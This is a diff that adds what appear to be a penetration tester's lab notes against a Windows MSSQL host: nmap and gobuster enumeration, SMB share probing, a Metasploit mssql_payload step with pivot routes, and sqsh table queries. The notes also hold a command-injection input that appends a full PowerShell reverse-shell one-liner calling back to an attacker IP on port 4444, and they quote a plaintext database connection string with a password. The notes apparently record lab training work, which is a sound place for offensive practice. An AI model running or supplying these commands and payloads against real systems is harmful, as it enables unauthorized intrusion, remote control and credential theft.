@@ -1,0 +1,43 @@
+
+nmap -sTVC 10.11.1.31 -Pn > nmapall.txt
+gobuster dir  -u http://10.11.1.31/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.11.1.31
+
+nmap -v -p 139, 445 --script=smb* 10.11.1.31 > smb.txt
+nmap --script=smb-enum-shares -Pn -p 445 10.11.1.31
+
+smbclient //10.11.1.31/wwwroot
+
+find ping html
+
+10.11.1.123&powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.197',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+find passowrd in logout.html
+cnn.open "PROVIDER=SQLOLEDB;DATA SOURCE=RALPH;User ID=sa;PWD=poiuytrewq;DATABASE=bankdb"
+
+
+https://www.rapid7.com/db/modules/exploit/windows/mssql/mssql_payload/
+
+use windows/mssql/mssql_payload    and  set passowrd get the
+
+background
+ route add 192.168.1.0/24 11
+ route print
+
+
+
+
+##################################################
+
+sqsh -S 10.11.1.31:1433 -U SA
+
+
+sp_helpdb
+master,model,msdb,tempdb
+
+sp_tables @table_name = '%',@table_owner = 'ralph',@table_qualifier = 'master'
+sp_tables @table_name = '%',@table_owner = 'ralph',@table_qualifier = 'model'
+sp_tables @table_name = '%',@table_owner = 'ralph',@table_qualifier = 'tempdb'
+sp_tables @table_name = '%',@table_owner = 'ralph',@table_qualifier = 'master'
+sp_tables @table_name = '%',@table_owner = 'ralph',@table_qualifier = 'master'
+###########################################################
